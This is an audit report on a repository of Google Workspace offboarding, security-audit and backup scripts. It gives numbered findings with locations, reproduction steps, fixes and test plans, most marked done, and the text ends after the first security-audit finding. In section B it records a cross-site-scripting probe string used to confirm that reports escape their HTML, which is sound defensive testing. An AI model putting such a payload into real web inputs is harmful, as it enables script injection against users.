# GoogleWorkspaceScripts audit: findings and fix plan

Date: 3 November 2026. Repository state: commit `b16ad9d` (GAM Script Checker v0.4.6, Offboarding v5.7.2, Security Audit v1.7.2). No code was changed during the audit; this document is the only file added. The GAM Script Checker section (C) was completed last, after its reviewer finished, and every under-warning in it was re-run by the coordinator.

## How to use this document

Every finding has an ID, a severity, a confidence label, the exact location, what happens, why it matters, how it was verified or how to reproduce it, a suggested fix, and a test to add. Work through them in a new session, one at a time, and interrogate each claim before changing anything: the reproduction notes are there so that each one can be re-run first.

Confidence labels:

- **CONFIRMED**: reproduced by running code against the script, or follows from unambiguous code reading that was double-checked by a second reader.
- **PLAUSIBLE**: the code path is real, but the trigger depends on Google or GAM behaviour that could not be exercised offline (no `gam`, `gyb` or `rclone` binary and no tenant in the audit environment). Verify on the dev tenant before fixing.

Severity is about consequence to an operator or client, not about how hard the fix is:

- **High**: wrong tenant state, lost data or a client-facing report that is wrong, under conditions that will occur in normal use.
- **Medium**: a documented promise that the code does not keep, a misleading result an operator would act on, or a safety gap with a narrower trigger.
- **Low**: edge cases, misleading output with no wrong action, docs drift, test hygiene.

Status boxes: `[ ]` open, `[x]` done, `[-]` rejected after interrogation (write the reason next to it).

## Method

- Every script was read in full, line by line, by eight parallel reviewers plus a coordinating reviewer, each with a bounded range and instructions to verify before reporting and to drop anything the tests or another code path already handled.
- Claims about GAM7 behaviour were checked against the current GAM7 source (`src/gam/__init__.py`, `gamlib/glcfg.py`) and the official `gam-install.sh`, fetched during the audit. Claims about the CISA SCuBA baseline were checked against the ScubaGoggles rego and defaults. Google's own Policy API pages were not reachable from the audit environment, so those are marked where it matters.
- All shipped test suites were run on Python 3.11, 3.12 and 3.13. A syntax and library sweep was run against each tool's stated Python floor (3.8 for offboarding and the CSV splitters, 3.9 for the audit and the checker, 3.6 for the GYB and mbox tools).
- Reviewers' scratch reproductions live outside the repository under the session scratchpad; the reproduction steps below are self-contained.

## Baseline

| Suite | Command the README gives | Result |
| --- | --- | --- |
| Offboarding unit | `python3 test_offboard_user.py` | 214 tests, OK (3.11, 3.12, 3.13) |
| Offboarding integration | `python3 test_offboard_main.py` | 29 tests, OK |
| Offboarding command builder | `npm test` (jsdom) | 7/7 OK |
| Security audit | `python3 test_tenant_scope.py` | **259 tests run, OK; 35 more exist and never run this way** (see AUD-T01) |
| Security audit via unittest | `python3 -m unittest test_tenant_scope` | 294 tests, OK |
| GAM Script Checker | `python developers/test_gamcheck.py` and the blind runner | OK; 177/187 blind cases, 0 under-warned, 5 documented over-warnings. The adversarial scripts in section C are in neither suite. |
| GYB tools | `python3 test_gyb_tools.py` | **1 failure** when run as root or on Windows (GYB-T01); all other tests pass |
| Mbox tools | `python3 test_vault_export_tools.py` | all checks passed |
| GAM7 update | `./test-gam-update.sh` | 4/4 OK |

## Priority list (start here)

These are the items most likely to bite in real use, across all tools, in suggested order.

0. CHK-01 to CHK-11: the GAM Script Checker prints READ-ONLY for scripts that delete (mid-word `#`, variable-named programs, `%~dp0gam.exe`, text piped into a shell, comment continuations, batch-file continuations, wrapper and alias resolution, mode ordering, rebound Python entry points), and paste mode can hand the rest of a paste to the shell. A safety tool that under-warns is worse than none, so these come first.
1. AUD-01 Empty internal-domain list turns every internal share and forward into an external finding.
2. AUD-02 A check that raises this month marks last month's findings from it as Resolved.
3. AUD-03 Licence waste reads seat counts that GAM7 only prints for four legacy SKUs, then reports "Checked and clean" everywhere else.
4. AUD-04 Group-targeted policies are merged into one bucket and shown as the root OU.
5. AUD-05 A failed organizer-grant removal followed by one Ctrl+C is never recorded.
6. AUD-06 Orphaned Shared Drive check misses drives whose only manager is suspended.
7. OFF-01 Ctrl+C between an alias delete and its re-create destroys the alias.
8. OFF-02 GYB access probe runs against a suspended leaver before the temporary unsuspend, so `--unsuspend` with any mailbox work cannot start.
9. OFF-03 Interrupted run exits 0 with no trace in the summary; later phases blame the destination.
10. AUD-T01 Thirty-five audit tests never run under the documented command.
11. UPD-01 Updater installs into `<parent>/gam7` whatever `-d` says, then verifies the old binary.
12. AUD-07 Evidence IDs collide, so the month-to-month diff is blind for most multi-row findings.
13. GYB-01 and GYB-02 Backup doctor misreads paths with `#`/`?`/`%` and can be fooled by a stray `.eml`.
14. CSV-01 Calendar filter silently drops UTC events on Python 3.8 to 3.10.

---

# A. Google Workspace Offboarding (`google-workspace-offboarding/`)

Files: `offboard_user.py` (5528 lines), `offboarding_command_builder.html`, `test_offboard_user.py`, `test_offboard_main.py`, `test_command_builder.js`, `README.md`.

No Critical finding. No path was found that suspends or deletes anyone other than the named user, that deletes without the snapshot and kill switch, or that writes in dry run. The scorched-earth gates (`--doit`, `--force`, typed address, Shared Drive check before the kill switch) hold. Phase order matches the README and suspension is genuinely last on every branch.

## A1. High

### OFF-01 `[x]` Ctrl+C between an alias delete and its re-create destroys the alias
- Done (`037dd31`): the create runs with bypass_shutdown; Ctrl+C is honoured between aliases and untouched aliases are a summary skip. Suite fence for test_offboard_main.py in 546c224.
- Severity High. CONFIRMED (reproduced with a stub; loop re-read by the coordinator).
- Where: `offboard_user.py:2936-2952` (`transfer_aliases`).
- What happens: the loop runs `delete alias` (line 2936), then `create alias ... user <destination>` without `bypass_shutdown=True`. `run_gam` (line 993) refuses every non-bypass call once `shutdown_requested` is set. A Ctrl+C that lands after the delete makes the create return "Shutdown requested", the retry loop breaks on `shutdown_requested`, and the alias is gone. The error printed is loud and names the manual command, but the tenant is worse off than before the run on an interrupt the script says it handles gracefully. A second alias in the list is also reported as "will bounce until recreated" although it was never deleted.
- Why it matters: this is the one place the script deliberately destroys something before recreating it. The kill switch protects its own seven steps with `bypass_shutdown=True` and a comment explaining why; this pair has no such protection.
- Reproduce: stub `run_gam` so that the first `delete alias` call sets `shutdown_requested = True` and returns success; call `transfer_aliases("l@x", "s@x", dry_run=False)` and observe the create is refused.
- Fix: once a delete has succeeded, run the create and its retry loop with `bypass_shutdown=True`; check `shutdown_requested` only before starting the next alias.
- Test: the stub scenario above, asserting the create is issued and the alias lands in `moved`.

### OFF-02 `[x]` GYB access probe and mailbox-size estimate run against a suspended leaver before the temporary unsuspend
- Done (`67e1685`): check_gyb_access() split out; main runs it after the temporary unsuspend, on the destination in restore-only, never for scorched earth; a failure on a suspended account names the suspension. Owed: dev-tenant `gyb --action quota` against a suspended user, to confirm the failure shape.
- Severity High. PLAUSIBLE for the trigger (Google refusing service-account impersonation of a suspended user, which is its documented behaviour), CONFIRMED for the ordering.
- Where: `check_dependencies` runs `gyb --email <leaver> --action quota --service-account` at `offboard_user.py:1318-1328`, and `_estimate_mailbox_bytes` (`gam user X show drivesettings`, line 3233) at line 1360. `main()` calls `check_dependencies` at line 5092; the `update user ... suspended off` is at line 5190.
- What happens: `need_gyb` is True whenever `--no-email` is absent, or `--backup-email` or `--reuse-email-backup` is set. For a suspended leaver the quota probe fails, `check_dependencies` prints "GYB service account cannot access <leaver>" with a domain-wide-delegation diagnosis and `main()` exits 2 before the unsuspend ever runs. The README's own example `python3 offboard_user.py --doit --unsuspend --user leaver@yourdomain.com` is this path. The disk-space preflight is also skipped silently for the same reason.
- Why it matters: `--unsuspend` cannot be used for a mailbox migration at all, with a misleading diagnosis. The live test plan only covers `--unsuspend --no-transfer` (where `need_gyb` is False) and the integration suite fakes `subprocess.run` for the quota probe (`test_offboard_main.py:210-212`), so neither layer sees it.
- Also affected: restore-only mode (`--reuse-email-backup`) probes GYB access to the source mailbox it never reads (lines 5086-5090). The leaver is normally suspended by then and `--reuse-email-backup` refuses `--unsuspend` (lines 4971-4977), so a resume may be refused with no way round short of unsuspending by hand.
- Verify first: on the dev tenant, run `gyb --email <suspended user> --action quota --service-account` and record the exact failure.
- Fix: move the GYB probe (and the size estimate) after the temporary unsuspend when `--unsuspend` is set, or probe the destination mailbox for restore-only mode, and distinguish "account suspended" from "DWD not granted" in the message.
- Test: `check_dependencies` with `need_gyb=True` against a suspended leaver plus `--unsuspend`, with the quota probe stubbed to fail only while suspended.

### OFF-03 `[x]` An interrupted run exits 0 with no trace in the summary, and later phases blame the destination
- Done (`5f2d722`): exit 130 (EXIT_INTERRUPTED) and a summary warning naming the last phase; checks between every transfer phase and before scorched deletion; delete_user says cancelled; second Ctrl+C exits 130. Pinned tests changed to 130; ScriptedGam now refuses calls after Ctrl+C like run_gam.
- Severity High (two reviewers found it independently). CONFIRMED (reproduced through the repository's own `MainFlowCase` harness).
- Where: `signal_handler` (708-716) records nothing; `_abort_if_shutdown` (5035-5038) calls `finish_run`, which returns `exit_code` untouched. `_abort_if_shutdown` runs before the transfer block and after calendar only; nothing sits between Drive, Shared Drive check, email, alias and calendar (5405-5420).
- What happens: (a) `--doit --force --user L --all-transfer-to S` with the flag set during group listing ends with exit 0, empty `summary_errors` and `summary_warnings`, no `suspended on`, no licence removed, no transfers; the kill switch has scrambled the password so the account is contained but not suspended, and a scheduler reading the README's "0 = success" marks it done. A SIGTERM from a job timeout is the realistic trigger. `test_ctrl_c_during_kill_switch_still_completes_containment` asserts `code == 0`, so the README contract and the test disagree. (b) A Ctrl+C during the Drive transfer terminates GAM, then `migrate_email` validates the destination through `run_gam`, gets `(False, "Shutdown requested")` and records "Destination user not found: successor@" and "Email migration skipped: destination invalid"; alias transfer reports every alias FAILED and bouncing though none was touched; the Shared Drive check reports "inconclusive". The ticket log then states that a valid successor was not found. (c) On the scorched-earth path, `delete_user` after a Ctrl+C prints "CRITICAL: Deletion FAILED ... still exists" instead of "cancelled" (5355, 4537-4542).
- Fix: in `_abort_if_shutdown` record `summary_warning("Run interrupted after <phase>")` and set a non-zero exit code (document which); check `shutdown_requested` between every transfer phase (or have each phase return early with a `summary_skip("skipped: shutdown requested")` when the flag is already set); make `delete_user` say "cancelled" when the refusal is the shutdown flag.
- Test: the harness scenario with the flag set mid-transfer, asserting the summary names the interruption and names no false destination error; update the pinned exit-code test deliberately.

## A2. Medium

### OFF-04 `[x]` "Unsuspend not verified" abort path can leave a started-suspended account active
- Done (`1b35841`): restore_original_suspension(always_issue=True) on the unverified-unsuspend abort; the abort goes through a summary error and finish_run.
- Severity Medium. PLAUSIBLE (needs the propagation lag the script has itself observed); logic CONFIRMED.
- Where: `restore_original_suspension` (1808-1815) returns True without issuing `suspended on` when a read says the account is still suspended; the abort branch in `main()` (5214-5220) calls it but no atexit guard is registered on that path (the `atexit.register` is only reached in the verified branch at 5212); the branch also `sys.exit(2)` without `finish_run`, so the restore outcome never reaches the summary or log footer.
- What happens: `update user X suspended off` returns success but `wait_for_suspended(user_email, False)` (60 s) does not see the flip. The script's own notes record an unsuspend whose `Updated` reply took over 70 s to take effect (4588-4590) and a flip that read back after 54 s (1824-1827). If the unsuspend lands after the 60 s poll and after the guard's single read, the account ends ACTIVE, the log says "Restoring the original state and aborting", exit code 2. The same race exists if Ctrl+C is pressed during the 60 s poll.
- Fix: in that branch always issue `suspended on` (idempotent) rather than trusting one read, or register the atexit guard before issuing the unsuspend; route the exit through `finish_run`.
- Test: `restore_original_suspension` with a read that says suspended followed by a flip; the "Could not verify" branch is currently untested.

### OFF-05 `[x]` A corrected interactive destination typo still exits 1
- Done (`b9af641`): validate_destination(record=False) from the interactive re-ask.
- Severity Medium. CONFIRMED (reproduced).
- Where: `validate_destination` (1600-1602) calls `summary_error` before `_plan_email` (1875-1878) re-asks; `exit_code` is never lowered.
- What happens: answering `jon@` then `good@` gives the right plan but `summary_errors == ['Destination not found: jon@...']` and exit 1, which the README defines as "errors in one or more phases".
- Fix: have `validate_destination` report the miss without recording a summary error when called from an interactive re-ask (pass a flag, or record the error only after the final answer).
- Test: assert `exit_code == 0` and empty `summary_errors` after a corrected typo.

### OFF-06 `[x]` `--reuse-email-backup` never reconciles the backup against disk
- Done (`e8def90`): verify_backup_complete() in the reuse branch, same early return.
- Severity Medium. CONFIRMED by code reading.
- Where: `migrate_email` 3609-3619 only checks that `msg-db.sqlite` exists; the normal path calls `verify_backup_complete()` and refuses a short backup.
- What happens: a backup whose DB lists more messages than are on disk (antivirus that deletes rather than locks, a partial copy to another machine, a hand-trimmed folder) restores short; `to_send` (3782) is the on-disk count so the summary says "N restored of N on disk". GYB skips absent files with a warning and exits 0. README: "A backup that comes up short against GYB's own message database fails the run."
- Fix: call `verify_backup_complete(backup_path)` in the reuse branch with the same early return.
- Test: a reuse folder with one DB row missing on disk; assert refusal.

### OFF-07 `[x]` "Devices found and listed for review" lists nothing
- Done (`0f4ac38`): the device CSV lines are printed and logged.
- Severity Medium. CONFIRMED (reproduced).
- Where: `manage_devices` 2451-2484 uses `capture_output=True`, so `run_gam` returns the CSV without logging it (1021-1022); the function only counts lines. The snapshot (2119-2125) does not capture devices either.
- What happens: the `resourceId`/`deviceId` needed for the printed `gam update mobile <resourceId> ...` commands never reach the console or the log. README: "Mobile and ChromeOS devices are listed for review and action."
- Fix: `logger.info(output)` when devices are found, or add the device CSVs to the snapshot JSON.

### OFF-08 `[x]` A failed or short Drive backup does not stop the Drive transfer
- Done (`74dc07c`): owner's call taken without asking (no questions until ship): the Drive transfer is held when --backup-drive failed; README says so.
- Severity Medium. Behaviour CONFIRMED; whether it is a defect or a design choice is for the owner to decide.
- Where: `run_phase("Drive backup (rclone)", ..., hold=transfer_failures)` at 5370-5371, then `transfer("drive", ...)` unconditionally at 5405; hold text at 5450-5463.
- What happens: rclone reports `Duplicate object found in source`, the backup phase records an error and joins `transfer_failures`, the Drive transfer then moves everything to the successor. The end-of-run text says "Licences RETAINED so the failed transfer can be retried" and "Rename them in Drive and re-run", but after `transfer drive` the leaver owns nothing, so re-running rclone against the leaver can never complete the archive. No data is lost.
- Fix: when `--backup-drive` was requested and the backup is in `transfer_failures`, either skip the Drive transfer (and say so) or change the hold wording to say the data is at the successor and the archive must be re-run there.

### OFF-09 `[x]` Command builder emits combinations the script rejects, and rejects one it accepts
- Done (`babb08f`): (a) to (d) fixed, jsdom test extended (14 checks); per-shell quoting assertions left for OFF-26.
- Severity Medium. CONFIRMED (jsdom probes; the coordinator verified the emitting lines and the parser checks).
- (a) `--unsuspend` (builder line 683) together with `--no-suspend` (in `SKIP_FLAGS`, line 464) is emitted with Copy enabled and "Ready, command is valid"; `parse_args` refuses the pair (4989-4993).
- (b) `--restore-batch-size 1` is emitted (builder only shows a note, 581-586); `parse_args` refuses 1 (4921-4926). The README (`1 to 100`) and the argparse help (`1-100`) also still say 1 is allowed.
- (c) Restore-only with `--force` (which the builder itself demands for restore-only) and `--email-to` plus `--reuse-email-backup` gives four "no destination resolves for the Drive/Alias/Calendar/Forward phase" errors and a disabled Copy button, because the `PHASE_DEST` loop (619-631) has no restore-only exclusion; the script only needs `--email-to` or `--all-transfer-to`.
- (d) The `--forward-alias-to` help (361-362) says the script sends a summary notice to that address; the script sends no email, it prints Admin console steps (`print_mail_capture_instructions`, 4677).
- (e) `test_command_builder.js` checks one flag only (`--allow-orphaned-shared-drives`); all of the above pass it.
- Fix: add the `--unsuspend`/`--no-suspend` exclusion, raise the batch-size minimum to 2 everywhere (builder, README, argparse help), skip the `PHASE_DEST` loop in restore-only mode, correct the help text, and extend the jsdom test with one assertion per rejected combination and one per shell for quoting.

## A3. Low

### OFF-10 `[x]` Log file contains ANSI colour codes on interactive runs
- Done (`3745d8a`): _PlainFormatter copied from the audit; file handler only.
- CONFIRMED. `_emit` (831-840) embeds `Colours.*` codes in the message and the `FileHandler` (776-783) receives the same record; colours are stripped only when stdout is not a TTY. The audit's `tenant_scope.py` already has a `_PlainFormatter` that strips them; copy it.

### OFF-11 `[x]` `_stream_process` reads in 256-character blocks, not as lines appear
- Done (`a609855`): binary pipe, read1(4096), incremental UTF-8 decoder; test fakes now BytesIO. Measured on HEAD: a short line arrived at 3.0 s (child exit).
- CONFIRMED (measured 2.5 s delay). `proc.stdout.read(256)` at 1078 blocks until 256 characters or EOF, so short GYB/rclone lines are logged late. Use `read1`/`os.read` on the raw buffer, or `readline` with `\r` handling.

### OFF-12 `[x]` Snapshot Gmail reads on a mailbox-less (Cloud Identity) leaver are recorded as errors
- Done (`15021b1`): the three Gmail reads still run when has_mailbox is False (the field can be wrong, OFF-19) but suppress the summary error and note the miss in the snapshot. Control errors on HEAD's missing kwarg, not on behaviour.
- PLAUSIBLE. `preflight_snapshot` 2110-2116 issues `show delegates`, `show forward`, `show sendas` without `suppress_summary_error`; for a Gmail-off user these fail (exit 73 per the script's own note at 1548-1552), so a `--no-transfer` offboarding records three errors and exits 1 although everything applicable succeeded. `has_mailbox` is known in `main()` and already drops `popimap` for this case; use it for the snapshot too.

### OFF-13 `[x]` Dependency check misattributes a general gam failure to a missing OU
- Done (`7a96c8a`): both probes failing reports GAM's own error, no OU remediation; FileNotFoundError and Exception branches honour suppress_summary_error.
- CONFIRMED by logic. 1265-1313: an `info domain` failure whose text lacks "oauth"/"unauthorized"/"credentials" (for example `invalid_grant: Token has been expired or revoked`) falls through to the OU probe, which also fails, and prints OU-creation remediation. Also `run_gam`'s `FileNotFoundError` and generic `Exception` branches (1052-1062) ignore `suppress_summary_error`, so "suppressed" probes can still add summary errors.

### OFF-14 `[x]` A failed alias read quietly weakens the self-transfer guard
- Done (`d4d30f0`): _list_aliases returns None on a failed read; _same_account(); preflight and restore-only refuse, the interactive re-ask asks again, transfer_aliases records an error. Also imported typing.Set (Python 3.15's deferred annotations hid the NameError 3.8 to 3.13 would raise).
- CONFIRMED. `_list_aliases` (2880) returns `[]` on failure; `preflight_destinations` (1488-1490, 1870-1871) then only checks the literal address and continues. Apply the script's own rule that an unreadable list counts as unknown, not as absent.

### OFF-15 `[x]` Failed delegate query prints a green `[OK]`
- Done (`fbdb40a`): success/failure branched; failure prints the manual command.
- CONFIRMED. `cleanup_delegates` 2652-2653: `print_success("No delegates found or unable to query.")` on a failed query; the summary error is recorded so the exit code is right, but the phase output is wrong. Branch on `success` and name the manual command as `remove_groups` does.

### OFF-16 `[x]` Forwarding verification uses a substring match
- Done (`fbdb40a`): the Forwarding Address value is parsed and compared whole.
- CONFIRMED. `setup_forwarding` 3891: `forward_to.lower() in status_line` lets `sam@x.com` be "verified" by an accepted `isam@x.com`; the following `forward on` fails with "Invalid forwarding address" and the diagnostic points away from the real cause (still pending). Parse `Forwarding Address: <addr>,` and compare equal.

### OFF-17 `[x]` `--backup-email` archive recorded as covered before the migration runs
- Done (`a921b57`): archive_note passed to migrate_email; recorded after verify_backup_complete passes.
- CONFIRMED. 5383-5395 records "Email archive: covered by the migration's retained GYB backup" before `migrate_email`; if it returns early the summary still says archived. Record it inside `migrate_email` after `verify_backup_complete` passes.

### OFF-18 `[x]` Prompts can appear mid-run after the plan was confirmed
- Done (`a921b57`): collect_plan picks the email and Drive backup folders (prompting there) and print_plan shows them; the phases take backup_path. No main-flow control for the prompt itself; the unit control errors on HEAD's missing kwarg.
- CONFIRMED. `_select_backup_path` (3481-3523) prompts "Found an existing ... backup ... sync into it?" from inside the Drive backup and the email migration when `--force` is absent, including in dry run (`backup_drive_rclone` calls it before its `dry_run` branch, 4333). `run_offboarding`'s docstring says the run is unattended after the plan. Decide the folder in `collect_plan` and echo it in the plan.

### OFF-19 `[x]` `has_mailbox` is read from a field the code elsewhere calls unreliable
- Done (`9bfafe9`): warning and summary warning naming gam user X imap off / pop off (both checked in GAM 7.50.00 source: setImap, setPop).
- PLAUSIBLE. `main()` 5129 reads "Mailbox is setup"; `_email_mailbox_missing`'s docstring (1551-1562) says that field stays False on licensed, restorable mailboxes. A False reading drops `popimap` from deprovision (2256-2258) and the log does not say POP/IMAP were left on. Mitigated by the password scramble, token revocation and suspension. At minimum log the omission.

### OFF-20 `[x]` `_gyb_db` creates an empty `msg-db.sqlite` where none exists
- Done (`9bfafe9`): _gyb_db raises FileNotFoundError for a missing DB; test helpers create the file first (46a1289, 16fa409).
- CONFIRMED (side effect), consequence latent. `_gyb_db` (2987) has no existence check; `count_undated_messages` and `_message_dates` can create a 0-byte DB, after which `_select_email_backup_path` treats the folder as a backup. `verify_backup_complete` and `_restored_count` guard; add the same guard to `_gyb_db`.

### OFF-21 `[x]` Duplicate-collision warning prints negative and zero counts
- Done (`b6c4063`): with named duplicates the shortfall is at least len(duplicates) and a padded folder is said to be padded.
- CONFIRMED (reproduced). `verify_drive_backup_complete` 4213-4219 and 4240-4244: with local leftovers from an earlier sync plus one rclone duplicate the output is "3 file(s) owned in Drive but 5 on disk (-2 missing)" and "short by 0 file(s)". Clamp at zero and word the padding case as the comment describes.

### OFF-22 `[x]` Unverified Drive reconciliation leaves no summary trace
- Done (`b6c4063`): intended as a gap, so a summary warning now; the pinned test was changed to expect it.
- CONFIRMED and pinned by `test_gam_failure_does_not_raise_or_warn`. 4188-4195: a failed or timed-out `print filelist` prints `[WARN]` and returns `(0, 0)` with no `summary_warning`, so "Drive backed up via rclone" reads as verified. Decide whether that is intended; if not, add the warning and change the test.

### OFF-23 `[x]` Flags silently ignored despite the README's "usage errors, not silent overrides"
- Done (`a4e9024`): all listed combinations refused in parse_args; restore-only also refuses every other skip and destination flag; --forward-alias-to stays accepted with --no-transfer (builder relies on it). README flag rows updated.
- CONFIRMED by probing `parse_args`. Accepted and ignored: `--reuse-email-backup` with `--no-suspend`, `--no-drive`, `--drive-to`, `--allow-orphaned-shared-drives`; `--scorched-earth` with `--forward-alias-to` (and the mail-capture block is never printed on the scorched path, 5356); `--no-transfer` with `--all-transfer-to`/`--drive-to`; `--allow-orphaned-shared-drives` without `--scorched-earth`. The comment at 4965-4968 says these should be usage errors.

### OFF-24 `[x]` Pre-logging failures surface as tracebacks
- Done (`dcf7b48`): --user validated in parse_args with the prompt's pattern; setup_logging OSError exits 2; --log-dir expanduser. Real-process test runs with PATH limited to the Python directory.
- CONFIRMED by logic. `setup_logging` (771 `mkdir`, FileHandler open) is unguarded and `--user` from the command line bypasses `prompt_email`'s regex, so an unwritable `--log-dir` or a `--user` containing `:` `*` `?` gives a raw traceback. Also `--log-dir` is not `expanduser()`-ed (5059) while `--backup-dir` is; the builder quotes `'~/logs'`, so a directory literally named `~` is created.

### OFF-25 `[x]` Docs and exit-code drift
- Done (`b375ffb`): (a) README snapshot list; (b) --force without --user is a usage error, examples carry --user; (c) admin hold exits 2, pinned test changed; (d) in OFF-09; (e) builder banner and restore-only --force demand, README domain field; (f) comment.
- CONFIRMED (three reviewers). (a) README "Pre-flight snapshot" lists signature, Drive settings and devices; the JSON holds user info, groups, aliases, delegates, forwarding, send-as and licences (sendas carries the signature). (b) README says `--user` is prompted only without `--force`; `main()` 5053-5057 prompts regardless, so the epilog example `--doit --force --scorched-earth` blocks on a prompt and exits 2 with a closed stdin. (c) The admin-account hold exits 1 via `finish_run` (5120-5124, pinned by `test_admin_account_blocks_before_any_write`) while every other preflight refusal exits 2; README says 2 is "nothing or little ran". (d) `--restore-batch-size` docs say 1 is allowed (see OFF-09). (e) Builder banner says no Execute combination skips containment, but restore-only does; builder says restore-only "Needs --force", the script does not; README mentions a builder "domain" field that does not exist. (f) `check_for_updates()` is labelled "Non-blocking" at 5071 but is a synchronous 3 s `urlopen` on every run.

### OFF-26 `[x]` Builder: PowerShell trailing-backslash quoting and brittle profile load
- Done (`783459e`): (a) trailing backslashes doubled for a spaced PowerShell path; not run on a Windows PowerShell 5.1 console (owed on the Windows VM). (b) mode and labels validated on load.
- PLAUSIBLE for (a), CONFIRMED for (b). (a) 489-491 single-quotes paths; Windows PowerShell 5.1 and 7.0 to 7.2 re-quote `'C:\Backup Folder\'` as `"C:\Backup Folder\"` for a native executable and the C runtime reads `\"` as an escaped quote. The cmd branch doubles trailing backslashes for exactly this reason; the PowerShell branch does not. (b) Line 755 builds a selector from a stored `mode`; a tampered or corrupt localStorage value throws uncaught in the click handler. Validate `mode` and `labels` as `command_shell` already is.

## A4. Improvements (not defects)

- `run_gam` (1004) does not pass `stdin=subprocess.DEVNULL`, unlike `run_gyb`; `run_gam_parallel` runs up to six gam processes sharing the terminal's stdin, so any gam prompt would hang to the timeout.
- `validate_destination` (1576) checks `Account Suspended` but not `Is Archived`; an archived destination has no Gmail, so a GYB restore fails after the download.
- `print_plan` (2014) omits group removal, delegate cleanup, licence removal, `--backup-drive`/`--backup-email` and `--scorched-earth`; the plan the operator confirms does not mention the licence removal.
- `preflight_snapshot` reports "Snapshot saved" with empty data when every read failed (2118-2120); record `{"error": ...}` per failed read and treat zero successful reads as a phase failure.
- `signal_handler` promises "force quit immediately" but the atexit re-suspend guard still runs for up to three minutes; say so.
- `remove_groups` already has the `Role` column; flag sole `OWNER` rows the way sole-organiser drives are flagged.
- `check_shared_drives` counts any other organizer ACL as safety; `permissions.N.deleted` is in the CSV, and a suspended other organizer is effectively no organizer.
- Deprovision output is not logged on success (`capture_output=True`); `logger.info(output)` would make the log self-contained.
- Compare the GYB backup against `show gmailprofile` `messagesTotal` to catch a backup that skipped messages with warnings and exited 0.
- Reuse mode could top up with a resumed `gyb --action backup` before restoring.
- `check_shared_drives` is read-only but skipped in dry run (3988), so the plan never shows an orphaned drive.
- Double summary errors on restore failure (`check_restore_destination_ready` plus `migrate_email`; attempt 20 records two). Cosmetic.

## A5. Verified OK (so the new session does not re-audit these)

- GAM7 syntax of every command issued: `update user ... org/recoveryemail/recoveryphone/password random changepassword on/gal off/suspended on|off`, `user X deprovision [popimap] signout [turnoff2sv]`, `print mobile query email:`, `print cros query user:`, `user X print groups`/`delete groups`, `show delegates`/`delete delegate`, `info user` licence block and `delete license <sku>`, `transfer drive <dest> keepuser`, `print aliases user`, `delete alias`/`create alias <a> user <dest>`, `add calendaracls <cal> writer user:<dest>`, `add forwardingaddress`/`show forwardingaddresses`/`forward on <addr> keep`, `vacation on`, `delete user`, `print filelist fields id,mimetype query ...`, `print shareddrives`, `print drivefileacls`. GYB flags and the `<dest>-restored.sqlite`/`restored_messages`/`msg-db.sqlite` shapes match GYB.
- Every parser runs correctly against every fixture in `fixtures/` (licence block with nested parentheses, `info user quick` keys for GAM 7.48.01, groups CSV, aliases header, delegates, header-only device output, forwardingaddresses accepted line, gmailprofile not enabled, drivesettings `329.85 TB`).
- `run_gam` dry-run returns before spawning; `non_fatal_patterns`, `suppress_summary_error`, shutdown gating and `bypass_shutdown` behave as documented; `wait_for_suspended` is None-safe; the kill switch's seven steps all bypass shutdown; a failed containment overrides `--no-suspend`.
- `preflight_destinations` runs after the skip flags are set, refuses the leaver and their aliases case-insensitively, accepts a group only for forwarding, and exits 2 before any write; `decide_unsuspend` matches the README (`--force` never implies `--unsuspend`).
- Temporary unsuspend: destinations validated first, read-back verified, `finish_run` restores before the summary with atexit as fallback, `no_suspend_contract_waived` only on a normal `--no-suspend` completion.
- Scorched earth requires `--doit` and `--force`, refuses every backup and transfer flag, re-types the primary address (alias resolved first), runs the Shared Drive gate before the kill switch, treats unreadable ACLs as blocking, keeps the snapshot.
- Batch ladder descends and floors correctly; `next_restore_action` terminates (terminal refusal, three stalled attempts, 20-attempt ceiling); all retry loops are bounded; Windows `PermissionError` path regex resolves the right file.
- Python 3.8: `ast.parse(feature_version=(3,8))` passes; no builtin generics in annotations, no `X | Y`, no `removeprefix`, no `match`, no `zoneinfo`; `shutil.move` gets `str()` paths; all subprocess and file I/O is explicit UTF-8.
- A SIGINT during `input()` on a pty runs the handler and the prompt continues, so a prompt-time Ctrl+C does not traceback.
- Builder: every emitted flag exists in `parse_args` with the same spelling; scorched mode emits only the accepted set; POSIX and cmd quoting are correct; `EMAIL_RE` excludes shell metacharacters; every DOM write uses `textContent`/`createElement`, so no XSS from form input; profiles never restore the scorched confirmation.

---

# B. Google Workspace Security Audit (`google-workspace-security-audit/`)

Files: `tenant_scope.py` (6895 lines), `policy_defaults.json`, `test_tenant_scope.py`, `tenants.example.json`, `README.md`.

No Critical finding. The read-only promise holds: the only write to a tenant is the documented temporary organizer grant in `collect_sd_external`, and the first Ctrl+C only sets a flag so the current drive's grant is still removed by the `finally`. HTML escaping is complete (an injection probe of `<script>alert(1)</script>'" onmouseover=x &` into every tenant-derived position produced zero raw occurrences in either report), the report contains no script, and `run_checks` isolates each check. The problems are in what the checks conclude and in a few interrupt and multi-tenant paths.

## B1. High

### AUD-01 `[x]` An empty internal-domain list turns every internal forward, send-as, filter, group member, Shared Drive member and file share into an "outside the organisation" finding
- Done (`8a95d3d`, `3fa4d7b`): an empty domain list judges nothing external, the checks are not listed clean, the report is held; `--only` always runs domains and domainaliases; domains is delivery-critical. Not done: seeding from the preflight's primary domain (a primary-only list would call secondary-domain colleagues external).
- Severity High. CONFIRMED (reproduced; the coordinator verified `collect()` and `preflight`).
- Where: `internal = set(ctx.internal_domains)` followed by `email_domain(x) not in internal` with no empty-list guard at 2389 (external file shares), 2569 (forwarding), 2619 (Shared Drive external), 2760 (filter forwarding), 2832 (filter BEC), 3208 (at-risk accounts), 3374 (admin recovery), 3493 (send-as), 3523 (forwarding addresses), 3551 (group members). Only `check_classroom_outsiders` (4092) guards. `ctx.internal_domains` is populated only by `derive_internal_domains` (2111) after the `domains`/`domainaliases` modules run; the preflight parses `gam info domain` and stores `primary_domain` in the manifest (1275) but never seeds `internal_domains`; `collect()` (2191-2247) does not stop when `domains` fails; `domains` is not in `DELIVERY_CRITICAL_MODULES`, so the gate passes the report.
- Triggers: (a) `--only forwards,sendas,delegates` on a fresh run directory (the README advertises `--only users,groups,dns`, and `scan_user_list` is written so a lone `--only sendas` works); (b) a full run where `print domains` errors (API hiccup, quota) while everything else succeeds.
- Result: every mailbox forwarding to a colleague is CRITICAL "forwarding outside the organisation", every send-as alias MEDIUM external, every group member and Shared Drive member HIGH external, and the client receives it with "Ready to send".
- Reproduce: build a `RunContext` with `internal_domains=[]`, `forwards.csv` row `u@example.com,True,team@example.com`; `check_external_forwarding` returns `external-forwarding` CRITICAL.
